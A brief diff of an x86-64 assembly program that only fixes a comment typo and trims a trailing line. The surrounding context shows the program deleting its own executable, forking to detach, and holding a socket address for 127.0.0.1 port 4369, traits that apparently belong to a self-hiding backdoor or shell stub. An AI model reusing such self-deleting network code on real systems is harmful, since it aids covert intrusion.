@@ -2,7 +2,7 @@
 	global _start
 	BITS 64
 _start:	
-	;; unlink argv[0	]
+	;; unlink argv[0]
 	mov rdi, [rsp + 8]
 	call _unlink
 	;; if (!fork()) exit
@@ -124,4 +124,3 @@ _do_syscall:
 	
 addr	dq 0x0100007f11110002
 fname   db "a",0
-	
